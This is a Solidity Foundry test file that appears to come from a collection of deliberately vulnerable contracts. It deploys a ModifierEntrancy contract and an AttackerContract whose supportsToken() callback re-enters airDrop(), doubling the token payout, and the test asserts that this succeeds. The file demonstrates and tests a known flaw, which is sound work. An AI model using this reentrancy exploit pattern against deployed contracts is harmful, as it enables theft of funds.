
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy, attack} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    AttackerContract public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new AttackerContract(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        // Capture initial balance of attacker in the token contract
        uint256 initialBalance = _contractUnderTest.tokenBalance(address(_attacker));
        assertEq(initialBalance, 0, "Initial balance should be 0");

        // Trigger the attack
        _attacker.attack();

        // Verify the exploit succeeded - attacker should have more than 20 tokens
        // due to reentrancy (called airDrop twice before state was updated)
        uint256 finalBalance = _contractUnderTest.tokenBalance(address(_attacker));
        
        // If reentrancy worked, balance should be 40 (20 + 20) instead of just 20
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertEq(finalBalance, 40, "Attacker should have 40 tokens due to reentrancy");
    }

    receive() external payable {}
}

contract AttackerContract {
    ModifierEntrancy public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    bool private hasBeenCalled;

    constructor(address victimAddress) {
        victim = ModifierEntrancy(victimAddress);
    }

    function supportsToken() external returns (bytes32) {
        // This is called by the victim contract's supportsToken modifier
        // We use this callback to re-enter the airDrop function
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            attackCallCount++;
            // Re-enter the airDrop function before the first call completes
            victim.airDrop();
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }

    function attack() public {
        // Reset state for the attack
        hasBeenCalled = false;
        attackCallCount = 0;
        exploitSucceeded = false;

        // Capture initial balance
        uint256 initialBalance = victim.tokenBalance(address(this));

        // Call the vulnerable airDrop function
        // The modifier supportsToken will call back to our supportsToken() function
        // which will re-enter airDrop before the first call updates the state
        victim.airDrop();

        // Check if reentrancy was successful
        // If successful, we should have 40 tokens (20 from each call)
        // because hasNoBalance modifier was checked before state update
        uint256 finalBalance = victim.tokenBalance(address(this));
        
        // The exploit succeeds if we got more than 20 tokens
        if (finalBalance > 20 && finalBalance == 40) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {}
}
